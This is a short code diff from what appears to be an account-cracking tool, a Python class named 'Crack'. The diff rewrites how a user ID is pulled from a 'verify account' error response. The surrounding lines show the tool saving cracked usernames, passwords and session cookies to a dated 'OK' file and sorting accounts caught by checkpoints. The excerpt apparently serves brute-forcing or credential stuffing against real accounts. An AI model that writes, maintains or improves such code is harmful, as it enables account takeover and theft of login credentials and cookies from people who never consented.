@@ -486,8 +486,7 @@ class Crack:
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
 						break
 				elif "User must verify their account" in post.text:
-					jason = post.json()["error_data"].encode("utf-8")
-					user = re.findall('"uid":(.*),"show_native_checkpoints"', jason)[0]
+					user = post.json()["error"]["error_data"]["uid"]
 					if user in self.ok or user in self.cp:
 						break
 					else:
